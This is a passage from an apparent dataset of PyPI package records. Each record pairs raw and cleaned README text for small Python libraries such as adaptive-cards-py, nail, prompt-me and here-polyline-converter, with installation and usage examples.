If you are interested in the general concepts of adaptive cards and want to dig a bit deeper, have a look into the [**official documentation**](https://learn.microsoft.com/en-us/adaptive-cards/) or start a jump start and get used to the [**schema**](https://adaptivecards.io/explorer/).

💡 **Please note**
This library is still in progress and is lacking some features. However, missing fractions are planned to be added soon. 

## About

This library is intended to provide a clear and simple interface for creating adaptive cards with only a few lines of code in a more robust way. The heavy usage of Python's typing library should
prevent one from creating invalid schemes and structures. Instead, creating cards should be intuitive and work like a breeze. 

For a comprehensive introduction into the main ideas and patterns of adaptive cards, have a look on the [**official documentation**](https://docs.microsoft.com/en-us/adaptive-cards). I also recommend using the [**schema explorer**](https://adaptivecards.io/explorer) page alongside the implementation, since the library's type system relies on these schemes.

💡 **Please note**
It's highly recommended to turn on the **type check** capabilities for Python in your editor. This will serve you with direct feedback about the structures you create. If you are trying to assign values of incompatible types, your editor will mark it as such and yells at you right in the moment you are about to do so.

## Features

+ Type annotated components based on Python's **dataclasses**
+ Schema validation for version compatibility
+ Simple `JSON` export
+ Compliant with the official structures and ideas

## Dependencies

* Python 3.10+
* `dataclasses-json`
* `StrEnum`

## Installation

```bash
pip install adaptive-cards-py
```

## Library structure

**Adaptive cards** can consist of different kind of components. The four main categories beside the actual cards are **Elements**, **Containers**, **Actions** and **Inputs**. You can find all available components for each category within the corresponding file. The `AdaptiveCard` is defined in `cards.py`.

In addition to that, some fields of certain components are of custom types. These types are living inside the `card_types.py` file. For instance, if you are about to assign a color to a `TextBlock`, the field `color` will only accept a value of type `Colors`, which is implemented in the aforementioned Python file.

To perform validation on a fully initialized card, one can make use of the `SchemaValidator` class. Similar to the whole library, this class provides a simple interface with only on method. The validation currently checks whether all used fields are compliant with the overall card version

## Usage

### A simple card

A simple `TextBlock` lives in the `elements` module and can be used after it's import. 

```Python
from adaptive_cards.elements import TextBlock

text_block: TextBlock = TextBlock(text=""It's your first card"")
```
For this component, `text` is the only required property. However, if more customization is needed, further available fields can be used.

```Python
from adaptive_cards.elements import TextBlock
import adaptive_cards.card_types as types

text_block: TextBlock = TextBlock(
    text=""It's your second card""
    color=types.Colors.ACCENT,
    size=types.FontSize.EXTRA_LARGE,
    horizontal_alignment=types.HorizontalAlignment.CENTER,
)
```

An actual card with only this component can be created like this.

```Python
from adaptive_cards.card import AdaptiveCard

...

version: str = ""1.4""
card: AdaptiveCard = AdaptiveCard.new(version) \
                                 .add_item(text_block) \
                                 .create()
```

Find your final layout below.

![simple card](examples/simple_card/simple_card.jpg)

💡 **Please note**
After building the object is done, the `create(...)` method must be called in order to create the final object. In this case, the object will be of type `AdaptiveCard`.

To directly export your result, make use of the 
`to_json()` method provided by every card.

```Python
with open(""path/to/out/file.json"", ""w+"") as f:
    f.write(card.to_json())

```

### Adding multiple elements at once

Assuming you have a bunch of elements you want your card to enrich with. There is also a method for doing so. Let's re-use the example from before, but add another `Image` element here as well. 

```Python
from adaptive_cards.elements import TextBlock, Image
import adaptive_cards.card_types as types

text_block: TextBlock = TextBlock(
    text=""It's your third card""
    color=types.Colors.ACCENT,
    size=types.FontSize.EXTRA_LARGE,
    horizontal_alignment=types.HorizontalAlignment.CENTER,
)

image: Image = Image(url=""https://adaptivecards.io/content/bf-logo.png"")

version: str = ""1.4""
card: AdaptiveCard = AdaptiveCard.new(version) \
                                 .add_items([text_block, image]) \
                                 .create()

# Alternatively, you can also chain multiple add_item(...) functions:
# card = AdaptiveCard.new(version) \
#                    .add_item(text_block) \
#                    .add_item(image) \
#                    .create()


with open(""path/to/out/file.json"", ""w+"") as f:
    f.write(card.to_json())
```

This will result in a card like shown below.

![simple card](examples/simple_card/simple_card_2.jpg)

### Validate schema

New components and fields are getting introduced every now and then. This means, if you are using an early version for a card and add fields, which are not compliant with it, you will have an invalid schema. To prevent you from exporting fields not yet supported by the card and target framework, a schema validation can be performed. It's as simple as that:

```Python
from adaptive_cards.validator import SchemaValidator, Result

...

version: str = ""1.4""
card: AdaptiveCard = AdaptiveCard.new(version) \
                                 .add_items([text_block, image]) \
                                 .create()

validator: SchemaValidator = SchemaValidator()
result: Result = validator.validate(card)

print(f""Validation was successful: {result == Result.SUCCESS}"")

```

## Examples

If you are interested in more comprehensive examples, have a look into the `examples` folder (coming soon!) or visit the samples page of the official documentation. 

## Roadmap

+ 🔎 More complete valdidation
+ 🚀 Better examples
+ 📕 Comprehensive documentation on code level
+ 🐍 Ready to use Python package
",dennis6p/adaptive-cards-py
wcmp,https://github.com/moshangsang24/wcmp,0,466,466,"# Python Wechat Message Push Package

A simple message plus package for notification via wechat.

## Installation

```bash
# Install via pip
pip install wcmp
```


## Usage

Here is a simple example for pushing a message to your wechat.

```python
import wcmp
# replace the 'X' with your token
s=wcmp('XXXXXXX')
s.send('messgaedf')
```

## About the Token
You need to get your personal token from [PushPlush](https://www.pushplus.plus/)


","# Python Wechat Message Push Package

A simple message plus package for notification via wechat.

## Installation

```bash
# Install via pip
pip install wcmp
```


## Usage

Here is a simple example for pushing a message to your wechat.

```python
import wcmp
# replace the 'X' with your token
s=wcmp('XXXXXXX')
s.send('messgaedf')
```

## About the Token
You need to get your personal token from [PushPlush](https://www.pushplus.plus/)


",moshangsang24/wcmp
metadynminer,https://github.com/Jan8be/metadynminer.py,0,0,0,,,jan8be/metadynminer.py
streamlit-controllerdf,https://github.com/joshjetson/SCDF/,4,4329,2650,"<p align=""center"">
  <img src=""https://i.imgur.com/4TfRxmI.png"" alt=""ctrldf""></img>
  <br/>
  <a href=""https://www.python.org/""><img src=""https://img.shields.io/badge/python-3670A0?style=plastic&logo=python&logoColor=ffdd54""></img></a>
  <a href=""https://streamlit.io/""><img src=""https://img.shields.io/badge/-Streamlit-61DAFB?style=plastic&logo=streamlit""></img></a>
  <a href=""https://matplotlib.org/""><img src=""https://img.shields.io/badge/Matplotlib-%23ffffff.svg?style=plastic&logo=matplotlib&logoColor=black""></img></a>
  <a href=""https://numpy.org/doc/stable/index.html""><img src=""https://img.shields.io/badge/numpy-%23013243.svg?style=plastic&logo=numpy&logoColor=white""></img></a>
  <a href=""https://pandas.pydata.org/docs/index.html""><img src=""https://img.shields.io/badge/pandas-%23150458.svg?style=plastic&logo=pandas&logoColor=white""></img></a>
  <a href=""http://opensource.org/licenses/MIT""><img src=""https://img.shields.io/badge/License-MIT-yellow.svg?style=plastic""></img></a>
  </a>

  
  <br/>
  <a href=""#Documentation"">Documentation</a> ·
  <a href=""https://github.com/joshjetson/SCDF/issues"">Report a Bug</a> ·
  <a href=""#Demo"">Demo</a> .
  <a href=""https://github.com/joshjetson/SCDF/issues"">Request Feature</a> ·
  <a href=""https://github.com/joshjetson/SCDF/pulls"">Send a Pull Request</a>

</p>

## Controller DF

[]()

<i>A python library which creates a simple and easy to use data frame controller.
Using this library, along with streamlit and minimal (*included*) code, anyone can spin up a web app which allows you to control, manipulate and display a data set quickly and easily.
</i>

## Demo

<table>
<tr>
<td>
<center>

<img src=""https://i.imgur.com/U0lIrfy.gif""></img>

- Quick column metrics

  <img src=""https://i.imgur.com/RuYRpFY.gif""></img>

- Rapid column filter

  <img src=""https://i.imgur.com/M0yiOv1.png""></img>

- Instant type based column widgets

  <img src=""https://i.imgur.com/OaROx3r.png""></img>
</center>

</table>
</tr>
</td>

## Installation

```
$ pip install streamlit-controllerDF
```

## Getting started

<i>After you pip install the module</i>



**Batteries included method:**



<details><summary>Quick start</summary>

>
> - `Copy the included test_code.py contents`
> - <a href=""https://raw.githubusercontent.com/joshjetson/SCDF/master/test_code.py"">test_code here click me</a>
> - `Create a new python file and paste the contents of test_code.py into it`
> - `Name the file something you like and then:`
> ~~~
> $ streamlit run your_project.py 
> ~~~
> - `Drag and drop csv file`
> - `Enjoy!`

</details>



**Batteries excluded method:**



<details><summary>Module only</summary>

> ~~~
> import streamlit_controllerDF as sc
> ~~~
> - `see documentation for usage`


</details>

## Documentation

<table>
<tr>
<td>

**class streamlit_controllerDF.Widgets(dataframe, omit_columns=list())**


> Parameters:
>> - dataframe: A pandas data frame
>>> - *Two-dimensional, size-mutable, potentially heterogeneous tabular data.*
>> - omit_columns: A list of column names to be excluded
>>> - *The column names must be exact*

#### Example
```
import streamlit_controllerDF as sc
import pandas as pd

mydf = pd.read_csv('mycsv.csv')

ctrldf = sc.Widgets(mydf,omit_columns=['Engine_Size', 'Year'])
```

**method streamlit_controllerDF.Widgets.metrics()**

> Parameters:
>> - *None*

#### Example
```
import streamlit_controllerDF as sc
import pandas as pd

mydf = pd.read_csv('mycsv.csv')

ctrldf = sc.Widgets(mydf,omit_columns=['Engine_Size', 'Year'])

ctrldf.metrics()
```

</table>
</tr>
</td>

## Limitations
- *This library is currently limited to support only files under 20MB*
- *Due to browser limitations only 12000 rows of data can be viewed at a time*

## To Do
*This library is the base of a much larger project.*
- [ ] Create a chart method which will populate various charts automatically
- [ ] Create a model method which will populate various ML models automatically
- [ ] Add support for automated api data import
- [ ] Add support for relational and non relational data bases
- [ ] Add support for automated queries
- [ ] Add support for big data
- [ ] Create large file size detection and implement chunking automatically
- [ ] Migrate from Pandas to Dask
- [ ] After Dask migration remove file size limitation

Thank you for viewing my project
sincerely
","










Documentation ·
  Report a Bug ·
  Demo .
  Request Feature ·
  Send a Pull Request


## Controller DF

[]()

A python library which creates a simple and easy to use data frame controller.
Using this library, along with streamlit and minimal (*included*) code, anyone can spin up a web app which allows you to control, manipulate and display a data set quickly and easily.


## Demo







- Quick column metrics

  

- Rapid column filter

  

- Instant type based column widgets

  





## Installation

```
$ pip install streamlit-controllerDF
```

## Getting started

After you pip install the module



**Batteries included method:**



Quick start

>
> - `Copy the included test_code.py contents`
> - test_code here click me
> - `Create a new python file and paste the contents of test_code.py into it`
> - `Name the file something you like and then:`
> ~~~
> $ streamlit run your_project.py 
> ~~~
> - `Drag and drop csv file`
> - `Enjoy!`





**Batteries excluded method:**



Module only

> ~~~
> import streamlit_controllerDF as sc
> ~~~
> - `see documentation for usage`




## Documentation





**class streamlit_controllerDF.Widgets(dataframe, omit_columns=list())**


> Parameters:
>> - dataframe: A pandas data frame
>>> - *Two-dimensional, size-mutable, potentially heterogeneous tabular data.*
>> - omit_columns: A list of column names to be excluded
>>> - *The column names must be exact*

#### Example
```
import streamlit_controllerDF as sc
import pandas as pd

mydf = pd.read_csv('mycsv.csv')

ctrldf = sc.Widgets(mydf,omit_columns=['Engine_Size', 'Year'])
```

**method streamlit_controllerDF.Widgets.metrics()**

> Parameters:
>> - *None*

#### Example
```
import streamlit_controllerDF as sc
import pandas as pd

mydf = pd.read_csv('mycsv.csv')

ctrldf = sc.Widgets(mydf,omit_columns=['Engine_Size', 'Year'])

ctrldf.metrics()
```





## Limitations
- *This library is currently limited to support only files under 20MB*
- *Due to browser limitations only 12000 rows of data can be viewed at a time*

## To Do
*This library is the base of a much larger project.*
- [ ] Create a chart method which will populate various charts automatically
- [ ] Create a model method which will populate various ML models automatically
- [ ] Add support for automated api data import
- [ ] Add support for relational and non relational data bases
- [ ] Add support for automated queries
- [ ] Add support for big data
- [ ] Create large file size detection and implement chunking automatically
- [ ] Migrate from Pandas to Dask
- [ ] After Dask migration remove file size limitation

Thank you for viewing my project
sincerely
",joshjetson/scdf
passlass48,https://github.com/TheCodingFreakj/password-manager,0,50,50,"A simple python wrapper for creating passwords

","A simple python wrapper for creating passwords

",thecodingfreakj/password-manager
nail,https://github.com/edsaav/nail,3,4589,4465,"# Nail

![nail logo](https://user-images.githubusercontent.com/10245964/233905871-c1947748-a7dc-4514-a01d-2e0c9446cca9.png)

Nail is a command-line tool that integrates LLM's generative capabilities into the development workflow. It can be used to quickly draft new files, modify existing code, debug errors, build unit tests, and more.

### Why use Nail?

Chat is currently the main way of interfacing with LLMs. This is great for many general use cases, but in a software development use case this leads to tedious manual copy and pasting of code and context. Nail bypasses chat and brings automated code generation into the place that developers are already working.

![nail basics demo](https://user-images.githubusercontent.com/10245964/234179828-c84ad757-3392-4df6-b6be-147ff337405b.gif)

### Why not Copilot/Tabnine etc?

Use both! Nail is complementary to these in-editor extensions. Nail is better suited for some situations such as whole-file generation, sweeping changes and refactors of existing files, and debugging. Editor extensions are likely more efficient for small adjustments to existing code.

### Can I send this code straight to production?

Please don't. The code generated by LLMs can vary in quality and your mileage may vary depending on coding language, LLM model, and problem complexity. That said, generated code can provide a great starting point and can help spark ideas for new approaches. Review all generated code and treat it with the same skepticism that you would for code written by another human being.

## Installation

To install Nail, you can use pip:

```
pip3 install nail
```

This will install the required dependencies and make the `nail` command available in your terminal.

## Configuration

Before using Nail, you need to configure it with your OpenAI API key. You can do this by running:

```
nail configure
```

This will prompt you to enter your API key, which will be saved for future use.

## Usage

Nail provides several commands to help you with your code:

### Build 🔨

To build a new file with optional context files, use the `build` command:

```
nail build <file> [--context-files <file1> <file2> ...] [--model <model>]
```

The target file should contain a description of the file that you are trying to build. The more specific the specification, the more accurate the result. As an example:

```
A python script with a function that does the following:
- accepts a URL string as a parameter
- raises an error if the URL is invalid
- scrapes the specified page for heading tags
- returns an array of resulting headings
```

If the file does not exist, nail will open your default editor to fill in the prompt in-line.

The `--context-files` (or `-c`) option can be used to pass in one or more additional files that could provide useful reference. For example, you can pass in files containing modules that should be imported and used by the new file that is being built.

### Modify 🔧

To modify an existing file, use the `modify` command:

```
nail modify <file> [--request <request>] [--context-files <file1> <file2> ...] [--model <model>]
```

The request should be in the form of a command, such as ""Add a new function that..."" or ""Refactor the existing class to..."".

### Debug 🐛

To debug an existing file, use the `debug` command:

```
nail debug <file> [--error <error_message>] [--model <model>]
```

If an error message is not passed, this command will simply look for any possible issues in the given file.

### Generate Unit Tests 🧪

To generate a unit test file for an existing file, use the `spec` command:

```
nail spec <file> <target_path> [--model <model>]
```

Once they have been generated, test files can be further adjusted with the `modify` command.

### Generate README 📖

To generate a README file for your project, use the `readme` command:

```
nail readme [--model <model>]
```

This command will gather all application files into context automatically. It will exclude a number of files irrelevant to a README, such as tests and licenses. Please note, this currently only works for relatively small projects given the limited context window available for GPT.

## Models

Nail currently supports the following models:

- gpt-3.5-turbo (default)
- gpt-4

You can specify the model to use with the `--model` option for each command.

## Development

To install Nail locally for development, clone the repo, then run this command from within the project directory:

```
pip3 install -e .
```

## Tests

Run the test suite using `pytest`.

## License

This project is licensed under the MIT License.
","# Nail

![nail logo](https://user-images.githubusercontent.com/10245964/233905871-c1947748-a7dc-4514-a01d-2e0c9446cca9.png)

Nail is a command-line tool that integrates LLM's generative capabilities into the development workflow. It can be used to quickly draft new files, modify existing code, debug errors, build unit tests, and more.

### Why use Nail?

Chat is currently the main way of interfacing with LLMs. This is great for many general use cases, but in a software development use case this leads to tedious manual copy and pasting of code and context. Nail bypasses chat and brings automated code generation into the place that developers are already working.

![nail basics demo](https://user-images.githubusercontent.com/10245964/234179828-c84ad757-3392-4df6-b6be-147ff337405b.gif)

### Why not Copilot/Tabnine etc?

Use both! Nail is complementary to these in-editor extensions. Nail is better suited for some situations such as whole-file generation, sweeping changes and refactors of existing files, and debugging. Editor extensions are likely more efficient for small adjustments to existing code.

### Can I send this code straight to production?

Please don't. The code generated by LLMs can vary in quality and your mileage may vary depending on coding language, LLM model, and problem complexity. That said, generated code can provide a great starting point and can help spark ideas for new approaches. Review all generated code and treat it with the same skepticism that you would for code written by another human being.

## Installation

To install Nail, you can use pip:

```
pip3 install nail
```

This will install the required dependencies and make the `nail` command available in your terminal.

## Configuration

Before using Nail, you need to configure it with your OpenAI API key. You can do this by running:

```
nail configure
```

This will prompt you to enter your API key, which will be saved for future use.

## Usage

Nail provides several commands to help you with your code:

### Build 🔨

To build a new file with optional context files, use the `build` command:

```
nail build  [--context-files   ...] [--model ]
```

The target file should contain a description of the file that you are trying to build. The more specific the specification, the more accurate the result. As an example:

```
A python script with a function that does the following:
- accepts a URL string as a parameter
- raises an error if the URL is invalid
- scrapes the specified page for heading tags
- returns an array of resulting headings
```

If the file does not exist, nail will open your default editor to fill in the prompt in-line.

The `--context-files` (or `-c`) option can be used to pass in one or more additional files that could provide useful reference. For example, you can pass in files containing modules that should be imported and used by the new file that is being built.

### Modify 🔧

To modify an existing file, use the `modify` command:

```
nail modify  [--request ] [--context-files   ...] [--model ]
```

The request should be in the form of a command, such as ""Add a new function that..."" or ""Refactor the existing class to..."".

### Debug 🐛

To debug an existing file, use the `debug` command:

```
nail debug  [--error ] [--model ]
```

If an error message is not passed, this command will simply look for any possible issues in the given file.

### Generate Unit Tests 🧪

To generate a unit test file for an existing file, use the `spec` command:

```
nail spec   [--model ]
```

Once they have been generated, test files can be further adjusted with the `modify` command.

### Generate README 📖

To generate a README file for your project, use the `readme` command:

```
nail readme [--model ]
```

This command will gather all application files into context automatically. It will exclude a number of files irrelevant to a README, such as tests and licenses. Please note, this currently only works for relatively small projects given the limited context window available for GPT.

## Models

Nail currently supports the following models:

- gpt-3.5-turbo (default)
- gpt-4

You can specify the model to use with the `--model` option for each command.

## Development

To install Nail locally for development, clone the repo, then run this command from within the project directory:

```
pip3 install -e .
```

## Tests

Run the test suite using `pytest`.

## License

This project is licensed under the MIT License.
",edsaav/nail
pyram-mogus,https://github.com/pypa/sampleproject,0,94,94,"USAGE:

var_name = pyram(value_in_gb)


eg.:

from pyram_mogus.pyram import pyram
a = pyram(4)","USAGE:

var_name = pyram(value_in_gb)


eg.:

from pyram_mogus.pyram import pyram
a = pyram(4)",pypa/sampleproject
pyaesm,https://github.com/ricmoo/pyaes,0,188,188,"A pure-Python implementation of the AES (FIPS-197)
block-cipher algorithm and common modes of operation (CBC, CFB, CTR, ECB,
OFB) with no dependencies beyond standard Python libraries.
","A pure-Python implementation of the AES (FIPS-197)
block-cipher algorithm and common modes of operation (CBC, CFB, CTR, ECB,
OFB) with no dependencies beyond standard Python libraries.
",ricmoo/pyaes
flet-multi-page,https://github.com/SKbarbon/flet_multi_page,1,244,244,"until now, flet v0.6 does not support multi pages.
 With this tool, you can start new pages on the same script without the need of creating new `app` class.
 visit the github repo for more: [github](https://github.com/SKbarbon/flet_multi_page)
","until now, flet v0.6 does not support multi pages.
 With this tool, you can start new pages on the same script without the need of creating new `app` class.
 visit the github repo for more: [github](https://github.com/SKbarbon/flet_multi_page)
",skbarbon/flet_multi_page
here-polyline-converter,https://github.com/heremaps/here-polyline-converter,1,2461,2461,"![workflow][b]
[![codecov][c1]][c2]

A tool to encode/decode [HERE legacy polyline][4] strings and convert them from/into HERE [Flexible Polyline][1] format.

Note that the [HERE Places (Search) API][2] is in maintenance: Developers need to adapt their applications to the newer
[HERE Geocoding & Search API][3] to benefit from the features developed after 2018.


## Install

```shell
pip install here-polyline-converter
```

## Usage


```python
>>> convert_legacy_to_flex(legacy_polyline_string)
```

Transforms a HERE legacy polyline string into a flexible polyline string. The legacy Polyline third dimension (segments width changes) is ignored.

```python
>>> encode_legacy(iterable)
```

Encodes a list of coordinates to the corresponding HERE legacy polyline string representation. 
Expected coordinates order: `(lat, lng[, width])`. Note that `width` is expected to be one of `DW`, `HW`, `CW`.


```python
>>> decode_legacy(legacy_polyline_string)
```

Decodes a HERE legacy polyline string into an array of coordinates `(lat, lng[, width])`.


Note that `width` is expected to be one of `DW`, `HW`, `CW`.

#### Examples

```python
>>> import here_search.polyline_converter as pc
>>> legacy_polyline = ""oz5xJ67i1B1B7PzIhaxL7Y""
>>> flexible_polyline = pc.convert_legacy_to_flex(legacy_polyline)
>>> flexible_polyline
'BFoz5xJ67i1B1B7PzIhaxL7Y'

>>> points = [(50.1022829, 8.6982122), (50.1020076, 8.6956695), (50.1006313, 8.6914960), (50.0987800, 8.6875156)]
>>> pc.encode_legacy(points)
'oz5xJ67i1B1B7PzIhaxL7Y'

>>> legacy_polyline = ""oz5xJ67i1B.C1B7PzIha.DxL7Y""
>>> pc.decode_legacy(legacy_polyline)
[(50.10228, 8.69821, 'CW'), (50.10201, 8.69567), (50.10063, 8.6915, 'DW'), (50.09878, 8.68752)]
```

## License

Copyright (C) 2023 HERE Europe B.V.

See the [LICENSE](./LICENSE) file in the root of this project for license details.

[1]: https://github.com/heremaps/flexible-polyline
[2]: https://developer.here.com/documentation/places/dev_guide/topics/guide.html
[3]: https://developer.here.com/documentation/geocoding-search-api/dev_guide/index.html
[4]: https://developer.here.com/documentation/places/dev_guide/topics/location-contexts.html#location-contexts__here-polyline-encoding
[b]: https://github.com/heremaps/here-polyline-converter/actions/workflows/test.yml/badge.svg
[c1]: https://codecov.io/gh/heremaps/here-polyline-converter/branch/main/graph/badge.svg?token=9LPI9T7BMN
[c2]: https://codecov.io/gh/heremaps/here-polyline-converter
","![workflow][b]
[![codecov][c1]][c2]

A tool to encode/decode [HERE legacy polyline][4] strings and convert them from/into HERE [Flexible Polyline][1] format.

Note that the [HERE Places (Search) API][2] is in maintenance: Developers need to adapt their applications to the newer
[HERE Geocoding & Search API][3] to benefit from the features developed after 2018.


## Install

```shell
pip install here-polyline-converter
```

## Usage


```python
>>> convert_legacy_to_flex(legacy_polyline_string)
```

Transforms a HERE legacy polyline string into a flexible polyline string. The legacy Polyline third dimension (segments width changes) is ignored.

```python
>>> encode_legacy(iterable)
```

Encodes a list of coordinates to the corresponding HERE legacy polyline string representation. 
Expected coordinates order: `(lat, lng[, width])`. Note that `width` is expected to be one of `DW`, `HW`, `CW`.


```python
>>> decode_legacy(legacy_polyline_string)
```

Decodes a HERE legacy polyline string into an array of coordinates `(lat, lng[, width])`.


Note that `width` is expected to be one of `DW`, `HW`, `CW`.

#### Examples

```python
>>> import here_search.polyline_converter as pc
>>> legacy_polyline = ""oz5xJ67i1B1B7PzIhaxL7Y""
>>> flexible_polyline = pc.convert_legacy_to_flex(legacy_polyline)
>>> flexible_polyline
'BFoz5xJ67i1B1B7PzIhaxL7Y'

>>> points = [(50.1022829, 8.6982122), (50.1020076, 8.6956695), (50.1006313, 8.6914960), (50.0987800, 8.6875156)]
>>> pc.encode_legacy(points)
'oz5xJ67i1B1B7PzIhaxL7Y'

>>> legacy_polyline = ""oz5xJ67i1B.C1B7PzIha.DxL7Y""
>>> pc.decode_legacy(legacy_polyline)
[(50.10228, 8.69821, 'CW'), (50.10201, 8.69567), (50.10063, 8.6915, 'DW'), (50.09878, 8.68752)]
```

## License

Copyright (C) 2023 HERE Europe B.V.

See the [LICENSE](./LICENSE) file in the root of this project for license details.

[1]: https://github.com/heremaps/flexible-polyline
[2]: https://developer.here.com/documentation/places/dev_guide/topics/guide.html
[3]: https://developer.here.com/documentation/geocoding-search-api/dev_guide/index.html
[4]: https://developer.here.com/documentation/places/dev_guide/topics/location-contexts.html#location-contexts__here-polyline-encoding
[b]: https://github.com/heremaps/here-polyline-converter/actions/workflows/test.yml/badge.svg
[c1]: https://codecov.io/gh/heremaps/here-polyline-converter/branch/main/graph/badge.svg?token=9LPI9T7BMN
[c2]: https://codecov.io/gh/heremaps/here-polyline-converter
",heremaps/here-polyline-converter
pidgin-eng-dictionary,https://github.com/Zeecoworld/pidgin-english-dictionary,1,576,576,"This is a simple python library that is useful for pidgin and english word interpretation.


####How to use the packages

from pidgin-eng-dictionary import getMeaning

typed_desired_word = input(""enter yr desired word here"")

meaning = getMeaning(typed_desired_word)
print(meaning)

#printing meaning of the word in console
# if type(meaning) == list:
#     for item in meaning:
#         print(item)
# else:
#     print(meaning)

# PIP PACKAGE DEPENDECIES

pip install difflib (built-in python library)


### KINDLY MAKE PR for UPGRADE....





","This is a simple python library that is useful for pidgin and english word interpretation.


####How to use the packages

from pidgin-eng-dictionary import getMeaning

typed_desired_word = input(""enter yr desired word here"")

meaning = getMeaning(typed_desired_word)
print(meaning)

#printing meaning of the word in console
# if type(meaning) == list:
#     for item in meaning:
#         print(item)
# else:
#     print(meaning)

# PIP PACKAGE DEPENDECIES

pip install difflib (built-in python library)


### KINDLY MAKE PR for UPGRADE....





",zeecoworld/pidgin-english-dictionary
prompt-me,https://github.com/Undertone0809/prompt-me,0,2223,2223,"# prompt-me

prompt-me是一个由OpenAI GPT API封装而成的轻量级聊天机器人，支持连续对话，提供缓存的功能，可以记录历史对话等功能，开箱即用。

# 特性

- 封装接口，开箱即用
- 内置API代理，不用科学上网也可以直接使用
- 支持调用ChatGPT API官方接口或自治代理
- 支持长对话聊天，聊天记录使用`cushy-storage`进行持久化
- 支持markdowm对话导出

# 快速上手

```shell script
pip install prompt-me --upgrade 
```

- 基本使用

```python
from prompt_me import ChatBot, enable_log


def main():
    # enable_log() # 日志功能
    print(""A Simple ChatBot built by ChatGPT API"")
    conversation_id = None
    while True:
        prompt = str(input(""[User] ""))
        bot = ChatBot(key='yourkey')
        ret, conversation_id = bot.ask(prompt, conversation_id)
        print(ret, conversation_id)


if __name__ == '__main__':
    main()
```

- 获取历史对话

```python
from prompt_me import ChatBot, enable_log_no_file


def main():
    # enable_log_no_file()
    bot = ChatBot(key='yourkey')
    ret, conversation_id = bot.ask(""please give me a bucket sort python code"")
    messages = bot.get_history(conversation_id)
    for message in messages:
        print(message)


if __name__ == '__main__':
    main()
```

- 导出历史对话为markdown

```python
from prompt_me import ChatBot, enable_log_no_file


def main():
    # enable_log_no_file()
    bot = ChatBot(key='yourkey')
    ret, conversation_id = bot.ask(""please give me a bucket sort python code"")
    # output_type默认为text，即输出markdown格式的字符串，传入file则导出为文件
    # file_path为要输出的文件名，不填入默认为output.md
    output_str = bot.output(conversation_id, output_type='file', file_path='output.md')
    print(output_str)


if __name__ == '__main__':
    main()

```


# TODO

- ~~可以导出历史消息为markdown格式~~
- 提供显示当前token（单词量）的功能
- ~~添加错误处理机制，如网络异常、服务器异常等，保证程序的可靠性~~
- 支持由终端直接输入key进行存储
- ~~开发ChatBot v2, [issue](https://github.com/Undertone0809/cushy-chat/issues/1)~~

# 参考

- 好人一生平安
- 感谢 [ayaka14732](https://github.com/ayaka14732)
  提供的API代理 [https://github.com/ayaka14732/ChatGPTAPIFree/](https://github.com/ayaka14732/ChatGPTAPIFree/blob/main/README-zh_CN.md)
- OpenAI
  API [https://platform.openai.com/docs/api-reference/chat/create](https://platform.openai.com/docs/api-reference/chat/create)
- OpenAI
  API [https://platform.openai.com/docs/guides/chat/instructing-chat-models](https://platform.openai.com/docs/guides/chat/instructing-chat-models)","# prompt-me

prompt-me是一个由OpenAI GPT API封装而成的轻量级聊天机器人，支持连续对话，提供缓存的功能，可以记录历史对话等功能，开箱即用。

# 特性

- 封装接口，开箱即用
- 内置API代理，不用科学上网也可以直接使用
- 支持调用ChatGPT API官方接口或自治代理
- 支持长对话聊天，聊天记录使用`cushy-storage`进行持久化
- 支持markdowm对话导出

# 快速上手

```shell script
pip install prompt-me --upgrade 
```

- 基本使用

```python
from prompt_me import ChatBot, enable_log


def main():
    # enable_log() # 日志功能
    print(""A Simple ChatBot built by ChatGPT API"")
    conversation_id = None
    while True:
        prompt = str(input(""[User] ""))
        bot = ChatBot(key='yourkey')
        ret, conversation_id = bot.ask(prompt, conversation_id)
        print(ret, conversation_id)


if __name__ == '__main__':
    main()
```

- 获取历史对话

```python
from prompt_me import ChatBot, enable_log_no_file


def main():
    # enable_log_no_file()
    bot = ChatBot(key='yourkey')
    ret, conversation_id = bot.ask(""please give me a bucket sort python code"")
    messages = bot.get_history(conversation_id)
    for message in messages:
        print(message)


if __name__ == '__main__':
    main()
```

- 导出历史对话为markdown

```python
from prompt_me import ChatBot, enable_log_no_file


def main():
    # enable_log_no_file()
    bot = ChatBot(key='yourkey')
    ret, conversation_id = bot.ask(""please give me a bucket sort python code"")
    # output_type默认为text，即输出markdown格式的字符串，传入file则导出为文件
    # file_path为要输出的文件名，不填入默认为output.md
    output_str = bot.output(conversation_id, output_type='file', file_path='output.md')
    print(output_str)


if __name__ == '__main__':
    main()

```


# TODO

- ~~可以导出历史消息为markdown格式~~
- 提供显示当前token（单词量）的功能
- ~~添加错误处理机制，如网络异常、服务器异常等，保证程序的可靠性~~
- 支持由终端直接输入key进行存储
- ~~开发ChatBot v2, [issue](https://github.com/Undertone0809/cushy-chat/issues/1)~~

# 参考

- 好人一生平安
- 感谢 [ayaka14732](https://github.com/ayaka14732)
  提供的API代理 [https://github.com/ayaka14732/ChatGPTAPIFree/](https://github.com/ayaka14732/ChatGPTAPIFree/blob/main/README-zh_CN.md)
- OpenAI
  API [https://platform.openai.com/docs/api-reference/chat/create](https://platform.openai.com/docs/api-reference/chat/create)
- OpenAI
  API [https://platform.openai.com/docs/guides/chat/instructing-chat-models](https://platform.openai.com/docs/guides/chat/instructing-chat-models)",undertone0809/prompt-me
pytest-patch,https://github.com/megawidget/pytest-patch,2,1878,1878,"# Pytest Patch

An automagic replacement for `monkeypatch` or `unittest.mock.patch` that can be
used on objects either directly or by name.

![tests](https://github.com/megawidget/pytest-patch/actions/workflows/python-package.yml/badge.svg)

## Usage

### patching objects directly

```
from pytest import fixture
from mock import MagicMock, sentinel

from mymodule import callee, caller  # `caller` returns `callee()`


@fixture
def callee_mock(patch):
  # returns the second argument if provided, `MagicMock()` otherwise
  return patch(callee, MagicMock(return_value=sentinel.callee))


def test_caller(callee_mock):
  assert caller() == sentinel.callee
```


### patching objects by name

```
@fixture
def callee_mock(patch):
  return patch('callee')  # assumes `callee` is in `mymodule`
```


### patching by full path

This behavior is similar to `unittest.mock.patch`.

```
@fixture
def callee_mock(patch):
  return patch('mymodule.callee')
```


## Configuration

By default, `pytest-patch` assumes the following repository structure:

```
mymodule/
  .git/
    ...
  mymodule/
    wat/
      ermelon.py
    ...
  tests/
    */  # e.g. unit/
      mymodule/
        wat/
          test_ermelon.py
    ...
```

No configuration is needed if your repository matches this structure where the
repository name is the same as the name of the module and your tests are in
their corresponding subdirectories mirroring your module's path structure.

If the above is not the case, e.g. you have a repository with a nonmatching
module name or a monorepo with multiple modules, you may specify the
corresponding flags either in the `pytest` command line or the ini file,
glob-style:

```
